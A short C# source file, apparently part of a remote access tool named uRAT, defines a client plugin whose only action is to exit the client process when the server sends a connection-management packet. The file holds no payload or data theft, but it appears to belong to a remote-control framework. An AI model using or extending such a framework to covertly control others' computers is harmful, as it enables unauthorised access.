using System;
using System.Collections.Generic;
using uNet2.Packet;
using uNet2.Packet.Events;
using uNet2.SocketOperation;
using uRAT.Client.Plugin.Client;
using uRAT.CoreClientPlugin.ConnectionManagement.Packets;

namespace uRAT.CoreClientPlugin.ConnectionManagement
{
    public class ConnectionManagementPlugin : IClientPlugin
    {
        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                    new ConnectionManagementPacket()
                };
            }
        }

        public List<ISocketOperation> SocketOperations
        {
            get { return null; }
        }

        public void Initialize()
        {
        }

        public void OnClientConnected()
        {

        }

        public void OnPacketReceived(object sender, ClientPacketEventArgs e)
        {
            if (e.Packet is ConnectionManagementPacket)
            {
                Environment.Exit(-1);
            }
        }
    }
}